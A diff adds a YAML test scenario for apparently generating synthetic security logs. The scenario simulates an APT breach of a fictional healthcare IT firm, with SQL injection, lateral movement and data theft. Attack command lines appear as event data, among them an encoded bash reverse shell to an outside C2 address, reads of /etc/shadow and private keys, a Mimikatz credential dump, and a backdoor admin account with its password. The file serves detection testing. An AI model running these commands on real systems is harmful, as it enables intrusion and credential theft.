@@ -1,0 +1,1487 @@
+version: "1.0"
+name: apt-healthcare-breach
+description: |
+  Comprehensive coverage test scenario: APT intrusion at Meridian Healthcare Solutions,
+  a mid-size healthcare IT company (~120 employees) providing EHR integration services.
+  External attacker exploits SQL injection on public-facing EHR portal, pivots through
+  the network, dumps credentials, exfiltrates patient and financial data over 14 hours.
+  Exercises all 26 storyline event types across 22+ log formats.
+
+environment:
+  description: "Meridian Healthcare Solutions — corporate HQ with on-premises data center providing EHR integration services"
+
+  timezone:
+    default: "America/Chicago"
+
+  users:
+    # Developer department
+    - username: marcus.chen
+      full_name: "Marcus Chen"
+      email: marcus.chen@meridianhcs.com
+      persona: developer
+      primary_system: WS-DEV-01
+      groups: ["engineering", "domain_users"]
+      browsing_intensity: heavy
+
+    - username: sarah.oconnell
+      full_name: "Sarah O'Connell"
+      email: sarah.oconnell@meridianhcs.com
+      persona: developer
+      primary_system: WS-DEV-02
+      groups: ["engineering", "domain_users"]
+
+    - username: raj.subramanian
+      full_name: "Raj Subramanian"
+      email: raj.subramanian@meridianhcs.com
+      persona: developer
+      primary_system: WS-DEV-03
+      groups: ["engineering", "domain_users"]
+
+    # IT / sysadmin
+    - username: tom.nakamura
+      full_name: "Tom Nakamura"
+      email: tom.nakamura@meridianhcs.com
+      persona: sysadmin
+      primary_system: WS-IT-01
+      groups: ["it_ops", "domain_admins", "domain_users"]
+
+    # Security
+    - username: diana.reyes
+      full_name: "Diana Reyes"
+      email: diana.reyes@meridianhcs.com
+      persona: security_analyst
+      primary_system: WS-SEC-01
+      groups: ["security", "domain_users"]
+
+    # Finance
+    - username: brian.kowalski
+      full_name: "Brian Kowalski"
+      email: brian.kowalski@meridianhcs.com
+      persona: accountant
+      primary_system: WS-FIN-01
+      groups: ["finance", "domain_users"]
+      browsing_intensity: light
+
+    # Data analytics
+    - username: priya.dasgupta
+      full_name: "Priya Dasgupta"
+      email: priya.dasgupta@meridianhcs.com
+      persona: data_analyst
+      primary_system: WS-DATA-01
+      groups: ["data_analytics", "domain_users"]
+
+    # Executive
+    - username: charles.whitfield
+      full_name: "Charles Whitfield"
+      email: charles.whitfield@meridianhcs.com
+      persona: executive
+      primary_system: WS-EXEC-01
+      groups: ["executives", "domain_users"]
+
+    # Project management
+    - username: lisa.fernandez
+      full_name: "Lisa Fernandez"
+      email: lisa.fernandez@meridianhcs.com
+      persona: project_manager
+      primary_system: WS-PM-01
+      groups: ["project_mgmt", "domain_users"]
+
+    # HR
+    - username: james.abara
+      full_name: "James Abara"
+      email: james.abara@meridianhcs.com
+      persona: hr
+      primary_system: WS-HR-01
+      groups: ["human_resources", "domain_users"]
+
+    # Sales
+    - username: angela.morrison
+      full_name: "Angela Morrison"
+      email: angela.morrison@meridianhcs.com
+      persona: sales
+      primary_system: WS-SALES-01
+      groups: ["sales", "domain_users"]
+      browsing_intensity: heavy
+
+    # Legal
+    - username: derek.hamill
+      full_name: "Derek Hamill"
+      email: derek.hamill@meridianhcs.com
+      persona: legal_counsel
+      primary_system: WS-LEGAL-01
+      groups: ["legal", "domain_users"]
+      browsing_intensity: light
+
+    # Marketing
+    - username: nina.volkov
+      full_name: "Nina Volkov"
+      email: nina.volkov@meridianhcs.com
+      persona: marketing
+      primary_system: WS-MKT-01
+      groups: ["marketing", "domain_users"]
+
+    # Front desk / receptionist
+    - username: maria.santos
+      full_name: "Maria Santos"
+      email: maria.santos@meridianhcs.com
+      persona: receptionist
+      primary_system: WS-FRONT-01
+      groups: ["front_desk", "domain_users"]
+
+    # Help desk
+    - username: kevin.tran
+      full_name: "Kevin Tran"
+      email: kevin.tran@meridianhcs.com
+      persona: help_desk
+      primary_system: WS-HELP-01
+      groups: ["it_ops", "domain_users"]
+
+    # Analyst
+    - username: emily.jacobs
+      full_name: "Emily Jacobs"
+      email: emily.jacobs@meridianhcs.com
+      persona: analyst
+      primary_system: WS-ANALYST-01
+      groups: ["business_ops", "domain_users"]
+
+    # Intern / engineer (intern persona)
+    - username: tyler.brooks
+      full_name: "Tyler Brooks"
+      email: tyler.brooks@meridianhcs.com
+      persona: intern
+      primary_system: WS-INTERN-01
+      groups: ["engineering", "domain_users"]
+
+  systems:
+    # Windows workstations — one per user
+    - hostname: WS-DEV-01
+      ip: "10.10.1.10"
+      os: "Windows 11"
+      type: workstation
+      assigned_user: marcus.chen
+
+    - hostname: WS-DEV-02
+      ip: "10.10.1.11"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: sarah.oconnell
+
+    - hostname: WS-DEV-03
+      ip: "10.10.1.12"
+      os: "Ubuntu 22.04"
+      type: workstation
+      assigned_user: raj.subramanian
+
+    - hostname: WS-IT-01
+      ip: "10.10.1.20"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: tom.nakamura
+
+    - hostname: WS-SEC-01
+      ip: "10.10.1.21"
+      os: "Ubuntu 22.04"
+      type: workstation
+      assigned_user: diana.reyes
+
+    - hostname: WS-FIN-01
+      ip: "10.10.1.30"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: brian.kowalski
+
+    - hostname: WS-DATA-01
+      ip: "10.10.1.31"
+      os: "Ubuntu 22.04"
+      type: workstation
+      assigned_user: priya.dasgupta
+
+    - hostname: WS-EXEC-01
+      ip: "10.10.1.40"
+      os: "Windows 11"
+      type: workstation
+      assigned_user: charles.whitfield
+
+    - hostname: WS-PM-01
+      ip: "10.10.1.41"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: lisa.fernandez
+
+    - hostname: WS-HR-01
+      ip: "10.10.1.42"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: james.abara
+
+    - hostname: WS-SALES-01
+      ip: "10.10.1.43"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: angela.morrison
+
+    - hostname: WS-LEGAL-01
+      ip: "10.10.1.44"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: derek.hamill
+
+    - hostname: WS-MKT-01
+      ip: "10.10.1.45"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: nina.volkov
+
+    - hostname: WS-FRONT-01
+      ip: "10.10.1.46"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: maria.santos
+
+    - hostname: WS-HELP-01
+      ip: "10.10.1.47"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: kevin.tran
+
+    - hostname: WS-ANALYST-01
+      ip: "10.10.1.48"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: emily.jacobs
+
+    - hostname: WS-INTERN-01
+      ip: "10.10.1.49"
+      os: "Windows 10"
+      type: workstation
+      assigned_user: tyler.brooks
+
+    # Servers — Windows
+    - hostname: DC-01
+      ip: "10.10.2.10"
+      os: "Windows Server 2022"
+      type: domain_controller
+
+    - hostname: FILE-SRV-01
+      ip: "10.10.2.11"
+      os: "Windows Server 2019"
+      type: server
+      services: ["SMB", "DFS"]
+
+    # Servers — Linux
+    - hostname: WEB-EXT-01
+      ip: "10.10.3.10"
+      os: "Ubuntu 22.04"
+      type: server
+      roles: [web_server]
+      services: ["Apache", "PHP"]
+      public_hostnames: ["ehr-portal.meridianhcs.com"]
+
+    - hostname: PROXY-01
+      ip: "10.10.3.11"
+      os: "Ubuntu 22.04"
+      type: server
+      roles: [forward_proxy]
+      services: ["Squid"]
+
+    - hostname: APP-INT-01
+      ip: "10.10.2.20"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["Tomcat", "Java"]
+
+    - hostname: DB-PROD-01
+      ip: "10.10.4.10"
+      os: "CentOS 7"
+      type: server
+      services: ["MySQL"]
+
+    - hostname: LOG-SRV-01
+      ip: "10.10.2.21"
+      os: "Ubuntu 22.04"
+      type: server
+      services: ["Elasticsearch", "Logstash"]
+
+    # Rogue device — attacker laptop
+    - hostname: YOURPC2
+      ip: "10.10.1.99"
+      os: "Windows 10"
+      type: workstation
+
+  service_accounts:
+    - svc_backup
+    - svc_monitor
+    - svc_sqlreader
+
+  stale_accounts:
+    - username: jennifer.walsh
+      last_active: "2023-11-15"
+      reason: "Transferred to London office"
+    - username: svc_legacy_crm
+      last_active: "2024-01-02"
+      reason: "CRM system decommissioned"
+    - username: robert.kim
+      last_active: "2023-09-30"
+      reason: "Former contractor, access not revoked"
+
+  groups:
+    - name: domain_users
+      members: [marcus.chen, sarah.oconnell, raj.subramanian, tom.nakamura, diana.reyes, brian.kowalski, priya.dasgupta, charles.whitfield, lisa.fernandez, james.abara, angela.morrison, derek.hamill, nina.volkov, maria.santos, kevin.tran, emily.jacobs, tyler.brooks]
+    - name: domain_admins
+      members: [tom.nakamura]
+    - name: engineering
+      members: [marcus.chen, sarah.oconnell, raj.subramanian, tyler.brooks]
+    - name: it_ops
+      members: [tom.nakamura, kevin.tran]
+    - name: security
+      members: [diana.reyes]
+    - name: finance
+      members: [brian.kowalski]
+    - name: data_analytics
+      members: [priya.dasgupta]
+    - name: executives
+      members: [charles.whitfield]
+    - name: project_mgmt
+      members: [lisa.fernandez]
+    - name: human_resources
+      members: [james.abara]
+    - name: sales
+      members: [angela.morrison]
+    - name: legal
+      members: [derek.hamill]
+    - name: marketing
+      members: [nina.volkov]
+    - name: front_desk
+      members: [maria.santos]
+    - name: business_ops
+      members: [emily.jacobs]
+
+  network:
+    segments:
+      - name: corporate_lan
+        cidr: "10.10.1.0/24"
+        description: "Corporate workstations"
+        systems: [WS-DEV-01, WS-DEV-02, WS-DEV-03, WS-IT-01, WS-SEC-01, WS-FIN-01, WS-DATA-01, WS-EXEC-01, WS-PM-01, WS-HR-01, WS-SALES-01, WS-LEGAL-01, WS-MKT-01, WS-FRONT-01, WS-HELP-01, WS-ANALYST-01, WS-INTERN-01, YOURPC2]
+      - name: server_vlan
+        cidr: "10.10.2.0/24"
+        description: "Internal servers"
+        systems: [DC-01, FILE-SRV-01, APP-INT-01, LOG-SRV-01]
+      - name: dmz
+        cidr: "10.10.3.0/24"
+        description: "DMZ — web-facing services"
+        exposure: both
+        systems: [WEB-EXT-01, PROXY-01]
+      - name: database_vlan
+        cidr: "10.10.4.0/24"
+        description: "Database segment — intentionally no sensor"
+        systems: [DB-PROD-01]
+
+    sensors:
+      - type: network
+        name: zeek-core
+        monitoring_segments: [corporate_lan, server_vlan]
+        direction: bidirectional
+        placement: span
+        log_formats: [zeek]
+
+      - type: network
+        name: zeek-dmz
+        monitoring_segments: [dmz]
+        direction: bidirectional
+        placement: span
+        log_formats: [zeek]
+
+      - type: ids
+        name: snort-perimeter
+        monitoring_segments: [dmz]
+        direction: inbound
+        placement: tap
+        log_formats: [snort_alert]
+
+      - type: firewall
+        name: fw-perimeter
+        monitoring_segments: [corporate_lan, server_vlan, dmz]
+        direction: bidirectional
+        placement: tap
+        log_formats: [cisco_asa]
+        interfaces:
+          corporate_lan: inside
+          server_vlan: inside
+          dmz: dmz
+        default_action: deny
+        deny_ratio: 5.0
+        nat_rules:
+          - type: dynamic_pat
+            src: [corporate_lan, server_vlan]
+            mapped_ip: "45.33.32.1"
+          - type: static
+            src: dmz
+            real_ip: "10.10.3.10"
+            mapped_ip: "198.51.100.10"
+        policy:
+          - {src: external, dst: dmz, ports: [80, 443]}
+          - {src: corporate_lan, dst: any}
+          - {src: server_vlan, dst: external, ports: [80, 443, 53]}
+          - {src: server_vlan, dst: server_vlan}
+          - {src: dmz, dst: server_vlan, ports: [3306]}
+
+time_window:
+  start: "2024-03-18T12:00:00Z"
+  duration: "14h"
+
+baseline_activity:
+  description: "Normal mid-week office activity at a healthcare IT company"
+  intensity: medium
+  variation: medium
+  suspicious_noise: medium
+
+logon_grace_period: "30m"
+
+storyline:
+  # === Phase 1: Scanning & Reconnaissance (+0h30m) ===
+
+  - id: evt-port-scan
+    time: "+0h30m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "External attacker scans DMZ segment for open services"
+    events:
+      - type: port_scan
+        source_ip: "185.70.41.45"
+        target_segment: dmz
+        ports: [22, 80, 443, 8080, 8443, 3306]
+        scan_rate: 50
+        technique: "T1046 - Network Service Scanning"
+
+  - id: evt-web-scan
+    time: "+0h30m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Nikto vulnerability scan against EHR portal"
+    events:
+      - type: web_scan
+        dst_ip: "10.10.3.10"
+        dst_port: 443
+        hostname: "ehr-portal.meridianhcs.com"
+        source_ip: "185.70.41.45"
+        preset: nikto
+        rate: 10
+        duration: "20m"
+        technique: "T1595.002 - Active Scanning: Vulnerability Scanning"
+
+  # === Phase 2: Rogue Device (+0h45m) ===
+
+  - id: evt-rogue-dhcp
+    time: "+0h45m"
+    actor: root
+    system: YOURPC2
+    activity: "Attacker plugs rogue laptop into corporate network, obtains IP via DHCP"
+    events:
+      - type: dhcp_lease
+        mac_address: "00:1A:2B:3C:4D:5E"
+        requested_ip: "10.10.1.99"
+        technique: "T1200 - Hardware Additions"
+
+  # === Phase 3: Initial Access — SQLi exploitation (+1h) ===
+
+  - id: evt-sqli-probe-1
+    time: "+1h"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Attacker probes EHR portal login with SQL injection"
+    events:
+      - type: connection
+        dst_ip: "10.10.3.10"
+        dst_port: 443
+        service: http
+        source_ip: "185.70.41.45"
+        method: "POST"
+        uri: "/ehr/api/v2/auth"
+        status_code: 500
+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        hostname: "ehr-portal.meridianhcs.com"
+        technique: "T1190 - Exploit Public-Facing Application"
+        description: "SQL injection probe — UNION SELECT against auth endpoint returns 500"
+
+  - id: evt-sqli-probe-2
+    time: "+1h0m15s"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Second SQLi probe — refining injection payload"
+    events:
+      - type: connection
+        dst_ip: "10.10.3.10"
+        dst_port: 443
+        service: http
+        source_ip: "185.70.41.45"
+        method: "POST"
+        uri: "/ehr/api/v2/auth"
+        status_code: 200
+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        hostname: "ehr-portal.meridianhcs.com"
+        technique: "T1190 - Exploit Public-Facing Application"
+        description: "Successful SQL injection — UNION SELECT extracts credentials"
+
+  # === Phase 4: Execution — Web shell & reverse shell (+1h20m) ===
+
+  - id: evt-webshell-upload
+    time: "+1h20m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Upload PHP web shell via SQLi file write"
+    events:
+      - type: connection
+        dst_ip: "10.10.3.10"
+        dst_port: 443
+        service: http
+        source_ip: "185.70.41.45"
+        method: "POST"
+        uri: "/ehr/assets/img/.ht-cache.php"
+        status_code: 200
+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        hostname: "ehr-portal.meridianhcs.com"
+        technique: "T1505.003 - Server Software Component: Web Shell"
+
+  - id: evt-reverse-shell
+    time: "+1h21m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Reverse shell callback from web shell to C2"
+    events:
+      - type: process
+        process_name: "/bin/bash"
+        command_line: "bash -c 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMzLjMyLjMwLzg0NDMgMD4mMQ== | base64 -d | bash'"
+        technique: "T1059.004 - Command and Scripting Interpreter: Unix Shell"
+      - type: connection
+        dst_ip: "45.33.32.30"
+        dst_port: 8443
+        service: ssl
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+        description: "Reverse shell connection to C2 server"
+
+  # === Phase 5: Discovery (+1h40m) ===
+
+  - id: evt-discovery-local
+    time: "+1h40m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Local network enumeration on compromised web server"
+    events:
+      - type: process
+        process_name: "/usr/sbin/ip"
+        command_line: "ip addr show"
+        technique: "T1016 - System Network Configuration Discovery"
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /etc/hosts"
+        technique: "T1016 - System Network Configuration Discovery"
+      - type: process
+        process_name: "/usr/bin/id"
+        command_line: "id"
+        technique: "T1033 - System Owner/User Discovery"
+
+  - id: evt-discovery-hosts-file-empty
+    time: "+1h42m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Fumble: attacker checks wrong file for host inventory"
+    events:
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /etc/hostname"
+        technique: "T1082 - System Information Discovery"
+        description: "Dead end — /etc/hostname only contains the local hostname"
+
+  - id: evt-discovery-nmap-ping
+    time: "+1h45m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Nmap ping sweep of server VLAN"
+    events:
+      - type: process
+        process_name: "/usr/bin/nmap"
+        command_line: "nmap -sn 10.10.2.0/24"
+        technique: "T1046 - Network Service Scanning"
+      - type: connection
+        dst_ip: "10.10.2.10"
+        dst_port: 0
+        service: icmp
+        technique: "T1046 - Network Service Scanning"
+      - type: connection
+        dst_ip: "10.10.2.11"
+        dst_port: 0
+        service: icmp
+        technique: "T1046 - Network Service Scanning"
+      - type: connection
+        dst_ip: "10.10.2.20"
+        dst_port: 0
+        service: icmp
+        technique: "T1046 - Network Service Scanning"
+      - type: connection
+        dst_ip: "10.10.2.21"
+        dst_port: 0
+        service: icmp
+        technique: "T1046 - Network Service Scanning"
+
+  - id: evt-discovery-nmap-ports
+    time: "+1h55m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Nmap port scan of discovered hosts in server VLAN"
+    events:
+      - type: process
+        process_name: "/usr/bin/nmap"
+        command_line: "nmap -sV -p 22,80,443,445,3306,3389,5432,8080 10.10.2.10 10.10.2.11 10.10.2.20 10.10.2.21"
+        technique: "T1046 - Network Service Scanning"
+
+  # === Phase 6: Credential Access — config file harvest (+2h15m) ===
+
+  - id: evt-cred-config-find
+    time: "+2h15m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Search for database credentials in web app config"
+    events:
+      - type: process
+        process_name: "/usr/bin/find"
+        command_line: "find /var/www -name '*.conf' -o -name '*.ini' -o -name '*.env' 2>/dev/null"
+        technique: "T1552.001 - Unsecured Credentials: Credentials In Files"
+
+  - id: evt-cred-config-cat
+    time: "+2h16m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Read database credentials from app config"
+    events:
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /var/www/ehr-portal/config/database.ini"
+        technique: "T1552.001 - Unsecured Credentials: Credentials In Files"
+
+  - id: evt-fumble-grep-ssh-wrong-dir
+    time: "+2h18m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Fumble: attacker looks for SSH keys in wrong directory"
+    events:
+      - type: process
+        process_name: "/usr/bin/find"
+        command_line: "find /home -name 'id_rsa' -o -name '*.pem' 2>/dev/null"
+        technique: "T1552.004 - Unsecured Credentials: Private Keys"
+        description: "Returns nothing — web server has no home directories with SSH keys"
+
+  - id: evt-cred-ssh-key
+    time: "+2h20m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Find SSH keys in www-data service account config"
+    events:
+      - type: process
+        process_name: "/usr/bin/find"
+        command_line: "find /var/www/.ssh /etc/ssh -name '*.pem' -o -name 'id_*' 2>/dev/null"
+        technique: "T1552.004 - Unsecured Credentials: Private Keys"
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /var/www/.ssh/id_ed25519"
+        technique: "T1552.004 - Unsecured Credentials: Private Keys"
+
+  # === Phase 7: Lateral Movement — SSH to APP-INT-01 (+2h30m) ===
+
+  - id: evt-fumble-ssh-wrong-host
+    time: "+2h30m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Fumble: attacker tries SSH to LOG-SRV-01 instead of APP-INT-01"
+    events:
+      - type: connection
+        dst_ip: "10.10.2.21"
+        dst_port: 22
+        service: ssh
+        technique: "T1021.004 - Remote Services: SSH"
+        description: "Connection refused — wrong host, LOG-SRV-01 has restricted SSH access"
+
+  - id: evt-lateral-ssh-app
+    time: "+2h32m"
+    actor: root
+    system: APP-INT-01
+    activity: "SSH lateral movement from WEB-EXT-01 to APP-INT-01"
+    events:
+      - type: ssh_session
+        source_ip: "10.10.3.10"
+        technique: "T1021.004 - Remote Services: SSH"
+
+  # === Phase 8: Credential Access — shadow dump on APP-INT-01 (+2h50m) ===
+
+  - id: evt-cred-shadow
+    time: "+2h50m"
+    actor: root
+    system: APP-INT-01
+    activity: "Dump /etc/shadow and /etc/passwd for offline cracking"
+    events:
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /etc/shadow"
+        technique: "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow"
+      - type: process
+        process_name: "/usr/bin/cat"
+        command_line: "cat /etc/passwd"
+        technique: "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow"
+
+  - id: evt-fumble-typo-cmd
+    time: "+2h53m"
+    actor: root
+    system: APP-INT-01
+    activity: "Fumble: attacker typos 'net gruop' before correcting"
+    events:
+      - type: process
+        process_name: "/usr/bin/bash"
+        command_line: "bash -c 'net gruop'"
+        technique: "T1087.002 - Account Discovery: Domain Account"
+        description: "Typo — 'gruop' instead of 'group', returns error"
+
+  # === Phase 9: Explicit Credentials — RunAs with compromised sysadmin (+3h10m) ===
+
+  # === Phase 10: Credential Spray + Lateral Movement — RDP (+3h30m) ===
+
+  - id: evt-cred-spray
+    time: "+3h30m"
+    actor: root
+    system: APP-INT-01
+    activity: "Credential spray against developer accounts"
+    events:
+      - type: credential_spray
+        source_ip: "10.10.2.20"
+        pattern: spray
+        target_accounts: [marcus.chen, sarah.oconnell, raj.subramanian]
+        success:
+          account: sarah.oconnell
+          after: 3
+        interval: "5s"
+        count: 10
+        technique: "T1110.003 - Brute Force: Password Spraying"
+
+  - id: evt-fumble-rdp-denied
+    time: "+3h35m"
+    actor: sarah.oconnell
+    system: WS-DEV-03
+    activity: "Fumble: attacker tries RDP to Linux workstation — denied"
+    events:
+      - type: connection
+        dst_ip: "10.10.1.12"
+        dst_port: 3389
+        source_ip: "10.10.2.20"
+        technique: "T1021.001 - Remote Services: Remote Desktop Protocol"
+        description: "Connection reset — WS-DEV-03 is Ubuntu, no RDP service"
+
+  - id: evt-lateral-rdp-dev
+    time: "+3h37m"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "RDP lateral movement to sarah.oconnell's Windows workstation"
+    events:
+      - type: rdp_session
+        source_ip: "10.10.2.20"
+        technique: "T1021.001 - Remote Services: Remote Desktop Protocol"
+
+  # === Phase 9b: Explicit Credentials — RunAs with compromised sysadmin (+3h40m) ===
+
+  - id: evt-explicit-creds
+    time: "+3h40m"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "Attacker uses RunAs with compromised tom.nakamura sysadmin account"
+    events:
+      - type: explicit_credentials
+        target_username: tom.nakamura
+        target_server: DC-01
+        process_name: "C:\\Windows\\System32\\runas.exe"
+        technique: "T1078.002 - Valid Accounts: Domain Accounts"
+        description: "Explicit credential usage to authenticate as domain admin via RunAs"
+
+  # === Phase 11: Discovery — AD enumeration (+3h50m) ===
+
+  - id: evt-discovery-whoami
+    time: "+3h50m"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "Enumerate current user context and privileges"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\whoami.exe"
+        command_line: "whoami /all"
+        technique: "T1033 - System Owner/User Discovery"
+
+  - id: evt-discovery-net-user
+    time: "+3h50m30s"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "Enumerate domain users"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net user /domain"
+        technique: "T1087.002 - Account Discovery: Domain Account"
+
+  - id: evt-discovery-domain-admins
+    time: "+3h51m"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "Enumerate Domain Admins group"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net group \"Domain Admins\" /domain"
+        technique: "T1069.002 - Permission Groups Discovery: Domain Groups"
+
+  - id: evt-discovery-ldap-query
+    time: "+3h52m"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "LDAP query to domain controller for service accounts"
+    events:
+      - type: connection
+        dst_ip: "10.10.2.10"
+        dst_port: 389
+        service: ldap
+        technique: "T1018 - Remote System Discovery"
+        description: "LDAP bind and search for service accounts"
+
+  - id: evt-discovery-net-view
+    time: "+3h53m"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "Enumerate network shares"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net view \\\\FILE-SRV-01 /all"
+        technique: "T1135 - Network Share Discovery"
+
+  - id: evt-fumble-empty-share
+    time: "+3h54m"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "Fumble: browse share that turns out to be empty"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\cmd.exe"
+        command_line: "cmd.exe /c dir \\\\FILE-SRV-01\\archive$ /s"
+        technique: "T1135 - Network Share Discovery"
+        description: "Dead end — archive$ share is empty"
+
+  # === Phase 12: Credential Access — Mimikatz (+4h30m) ===
+
+  - id: evt-mimikatz-exec
+    time: "+4h30m"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "Execute Mimikatz disguised as ms-index-service.exe for credential dumping"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\Temp\\ms-index-service.exe"
+        command_line: "C:\\Windows\\Temp\\ms-index-service.exe privilege::debug sekurlsa::logonpasswords exit"
+        technique: "T1003.001 - OS Credential Dumping: LSASS Memory"
+      - type: create_remote_thread
+        target_process: "lsass.exe"
+        technique: "T1003.001 - OS Credential Dumping: LSASS Memory"
+        description: "CreateRemoteThread injection into lsass.exe for credential extraction"
+
+  # === Phase 13: Lateral Movement — PsExec to DC-01 (+5h) ===
+
+  - id: evt-fumble-psexec-wrong-cred
+    time: "+5h"
+    actor: sarah.oconnell
+    system: DC-01
+    activity: "Fumble: first PsExec attempt with sarah.oconnell creds — insufficient privilege"
+    events:
+      - type: failed_logon
+        source_ip: "10.10.1.11"
+        logon_type: 3
+        technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
+        description: "Failed — sarah.oconnell is not a domain admin"
+
+  - id: evt-lateral-psexec-dc
+    time: "+5h2m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "PsExec lateral movement to DC-01 using stolen domain admin credentials"
+    events:
+      - type: logon
+        source_ip: "10.10.1.11"
+        logon_type: 3
+        technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
+      - type: process
+        process_name: "C:\\Windows\\System32\\cmd.exe"
+        command_line: "cmd.exe /c C:\\Windows\\PSEXESVC.exe"
+        technique: "T1569.002 - System Services: Service Execution"
+      - type: connection
+        dst_ip: "10.10.2.10"
+        dst_port: 445
+        service: smb
+        source_ip: "10.10.1.11"
+        technique: "T1021.002 - Remote Services: SMB/Windows Admin Shares"
+
+  # === Phase 14: Privilege Escalation — Backdoor account (+5h15m) ===
+
+  - id: evt-create-backdoor-account
+    time: "+5h15m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Create backdoor domain account svc_sqlreader"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net user svc_sqlreader Hc$2024!Prod /add /domain"
+        technique: "T1136.002 - Create Account: Domain Account"
+      - type: account_created
+        target_username: svc_sqlreader
+        technique: "T1136.002 - Create Account: Domain Account"
+
+  - id: evt-add-to-domain-admins
+    time: "+5h16m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Add backdoor account to Domain Admins"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net group \"Domain Admins\" svc_sqlreader /add /domain"
+        technique: "T1098 - Account Manipulation"
+      - type: group_member_added
+        group_name: "Domain Admins"
+        member_name: svc_sqlreader
+        technique: "T1098 - Account Manipulation"
+
+  # === Phase 15: Persistence — Service + Scheduled Task (+5h30m) ===
+
+  - id: evt-install-service
+    time: "+5h30m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Install persistent service HealthMonitorSvc on DC-01"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\sc.exe"
+        command_line: "sc create HealthMonitorSvc binPath= \"C:\\Windows\\System32\\svchost.exe -k netsvcs -p\" start= auto"
+        technique: "T1543.003 - Create or Modify System Process: Windows Service"
+      - type: service_installed
+        service_name: "HealthMonitorSvc"
+        service_file_name: "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"
+        service_account: "LocalSystem"
+        technique: "T1543.003 - Create or Modify System Process: Windows Service"
+
+  - id: evt-create-schtask
+    time: "+5h32m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Create scheduled task for persistence on DC-01"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\schtasks.exe"
+        command_line: "schtasks /Create /TN \"\\Microsoft\\Windows\\Maintenance\\SystemHealthCheck\" /TR \"C:\\Windows\\System32\\svchost.exe -k netsvcs\" /SC DAILY /ST 02:00 /RU SYSTEM"
+        technique: "T1053.005 - Scheduled Task/Job: Scheduled Task"
+      - type: scheduled_task_created
+        task_name: "\\Microsoft\\Windows\\Maintenance\\SystemHealthCheck"
+        technique: "T1053.005 - Scheduled Task/Job: Scheduled Task"
+
+  # === Phase 16: C2 Beaconing (+5h45m) ===
+
+  - id: evt-c2-beacon-dc
+    time: "+5h45m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "HTTPS beacon from DC-01 to C2 server"
+    events:
+      - type: beacon
+        dst_ip: "45.33.32.30"
+        dst_port: 443
+        hostname: "cdn-assets-update.com"
+        service: ssl
+        interval: "10m"
+        duration: "8h"
+        jitter: 0.3
+        method: GET
+        uri: "/api/v1/health"
